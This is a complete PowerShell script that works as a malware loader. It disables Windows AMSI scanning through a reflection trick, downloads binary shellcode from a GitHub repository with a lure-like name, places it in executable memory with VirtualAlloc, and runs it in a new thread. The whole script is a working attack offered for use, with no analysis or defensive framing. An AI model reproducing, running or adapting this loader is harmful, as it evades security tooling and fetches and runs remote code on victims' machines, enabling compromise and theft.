# Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)

# Set TLS to handle secure connections
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download the shellcode
$wc = New-Object System.Net.WebClient
$shellcode = $wc.DownloadData('https://github.com/unblockedgames2/Fanta.Live/raw/refs/heads/main/loader.bin')

# Define P/Invoke functions for VirtualAlloc, CreateThread, etc.
$pinvokeCode = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern UIntPtr VirtualAlloc(UIntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(UIntPtr lpThreadAttributes, uint dwStackSize, UIntPtr lpStartAddress, UIntPtr lpParameter, uint dwCreationFlags, out UIntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type -TypeDefinition $pinvokeCode

# Allocate memory for the shellcode in the current process
$buffer = [Win32]::VirtualAlloc([UIntPtr]::Zero, [UInt32]$shellcode.Length, 0x3000, 0x40)
if ($buffer -eq [UIntPtr]::Zero) {
    Write-Error "Failed to allocate memory in the process."
    exit 1
}

# Copy the shellcode into the allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [IntPtr]$buffer, $shellcode.Length)

# Create a thread to execute the shellcode
$threadId = [UIntPtr]::Zero
$hThread = [Win32]::CreateThread([UIntPtr]::Zero, 0, $buffer, [UIntPtr]::Zero, 0, [ref]$threadId)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create a remote thread."
    exit 1
}

# Wait for the shellcode to finish executing
[Win32]::WaitForSingleObject($hThread, 0xFFFFFFFF)
